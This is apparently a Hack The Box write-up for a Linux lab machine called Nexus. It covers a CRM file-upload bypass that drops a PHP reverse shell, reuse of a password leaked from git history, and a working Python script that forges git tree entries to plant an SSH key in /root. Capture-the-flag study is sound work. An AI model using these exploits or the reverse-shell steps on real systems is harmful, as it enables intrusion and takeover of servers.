# HTB: Nexus

**Machine:** Nexus (Linux)
**Skills:** Subdomain Enumeration, Credential Leakage (Git History), CVE Exploitation, File Upload Bypass, Path Traversal / Arbitrary File Write, Git Internals Abuse
**Tools:** nmap, ffuf, Gitea, Burp Suite, git, ssh-keygen

Target: `10.129.44.149`

---

## Recon — Nmap

```bash
nmap -sC -sV 10.129.44.149
```

```
22/tcp  open  ssh
80/tcp  open  http (nginx)
```

Just SSH and a web server — the web app is the way in.

## Virtual Host Setup

```bash
echo '10.129.44.149 nexus.htb' | sudo tee -a /etc/hosts
```

The site serves different content based on the `Host` header, so `nexus.htb` needs to resolve locally before port 80 shows anything useful.

## Subdomain Enumeration — FFUF

```bash
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 154
```

Turned up two subdomains: `git` and `billing`. Added both to `/etc/hosts` the same way.

## Credential Leak — Gitea

Browsing to `http://git.nexus.htb/` turned up a repo: `admin/krayin-docker-setup`. Digging through its commit history exposed a plaintext password for the billing site.

## Recon — Billing Dashboard (Krayin CRM)

Logged into `http://billing.nexus.htb/` using a hiring manager's email (found during recon) as the username, paired with the password leaked from the commit history. The dashboard identifies itself as **Krayin CRM v2.2.0**. Looking up known exploits for that version turns up **CVE-2026-38526**, with public PoCs here:

- https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md
- https://github.com/NathanHimself/CVE-2026-38526-PoC

## Exploitation — File Upload Bypass

The CRM's email composer lets you attach files, but only accepts certain extensions up front. Grabbed [pentestmonkey's PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php), set `$ip` to my Kali IP, and saved it as `reverse-shell.png` to get it past that check (full file: [`reverse-shell.php`](./reverse-shell.php)).

Set up a listener matching the script's hardcoded port:

```bash
nc -lvnp 1234
```

Attached the "png" to an email in the CRM, then used Burp Suite to intercept the upload request and rewrite the filename from `.png` back to `.php` before forwarding it. The server saved it as PHP, and triggering it popped the shell.

## Stabilizing & Initial Loot

```bash
script /dev/null -c /bin/bash
find . -type d -name "krayin"
```

Found the app at `/var/www/krayin`. Its `.env` (a standard Laravel-style config file) leaks database credentials:

```
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

Checked `/etc/passwd` for accounts worth targeting:

```
laurel:x:999:988::/var/log/laurel:/bin/false
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

## Foothold — SSH as jones

The DB password from `.env` turns out to be reused for jones' SSH login — password reuse again.

```bash
ssh jones@10.129.44.149
# password: y27xb3ha!!74GbR
cat user.txt
```

**user.txt:** `59...{REDACTED}...8c`

## Privilege Escalation — Gitea Template Sync Path Traversal

```bash
systemctl list-timers
```

```
Tue 2026-07-14 17:40:10 UTC   18s   Tue 2026-07-14 17:39:09 UTC   41s ago   gitea-template-sync.timer   gitea-template-sync.service
```

`/etc/gitea/template-sync.py` runs on that timer. It clones every Gitea repo marked as a "template" and syncs their file contents into a staging directory:

```python
GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"
```

The bug is in how it writes each synced file:

```python
target = os.path.join(stage_path, filepath)
os.makedirs(os.path.dirname(target), exist_ok=True)
```

`filepath` comes straight from the repo tree with no sanitization, so a path containing `..` walks the write outside `STAGING_DIR`. A repo's staging path is `/home/git/template-staging/<owner>/<repo>/`, so it takes 5 levels of `..` to reach `/root/`.

### Building the Payload

First, a keypair to plant:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

- `-t ed25519` — smaller keys than RSA
- `-f /tmp/.k` — writes the private key to `.k`, public key to `.k.pub`
- `-N ''` — empty passphrase, so it never prompts for one

Git's own `add`/`commit` won't let you track a path containing `..` — so [`build.py`](./build.py) constructs the malicious commit by hand, writing raw blob/tree/commit objects straight into `.git/objects`:

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha
def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

The tree it builds has two branches: a normal `README.md`, and a `..` entry nested five levels deep that finally places `authorized_keys` (the attacker's public key) inside a `.ssh` directory under `root`. When the sync script joins that path onto the staging directory without sanitizing it, the five `..` segments walk it straight out of `template-staging/jones/RCE/` and into `/root/.ssh/`.

### Delivering It

Logged into Gitea as jones and created a new repo called `RCE`, marked as a template — that's what the sync timer watches for. Cloned it down, forcing DNS resolution manually since `git.nexus.htb` isn't guaranteed to resolve in every context:

```bash
cd /tmp
git -c http.curloptResolve="git.nexus.htb:80:10.129.44.149" clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/RCE.git
cd RCE
```

Wrote `build.py` on Kali, served it over HTTP, then pulled it down and ran it from inside the `RCE` clone:

```bash
wget http://10.10.15.165:8888/build.py
python3 build.py
# Done: 08dc115f158857c5bed5a2d979a208c5b51594dd
```

Force-pushed the crafted commit up to Gitea, overwriting the template:

```bash
git -c http.curloptResolve="git.nexus.htb:80:10.129.44.149" push -u origin main --force
```

The timer fired and confirmed it in the log:

```
[2026-07-16 16:16:18] Found 1 template repo(s)
[2026-07-16 16:16:18] Syncing template: jones/RCE
[2026-07-16 16:16:18]   synced: README.md
[2026-07-16 16:16:18]   synced: ../../../../../root/.ssh/authorized_keys
[2026-07-16 16:16:18] Template sync complete
```

The public key had landed in `/root/.ssh/authorized_keys`.

## Root

```bash
ssh -i /tmp/.k root@10.129.44.149
cat root.txt
```

**root.txt:** `00...{REDACTED}...f0`

---

## References
- [CVE-2026-38526 PoC — TREXNEGRO/Security-Advisories](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)
- [CVE-2026-38526 PoC — NathanHimself](https://github.com/NathanHimself/CVE-2026-38526-PoC)
- [pentestmonkey PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php)
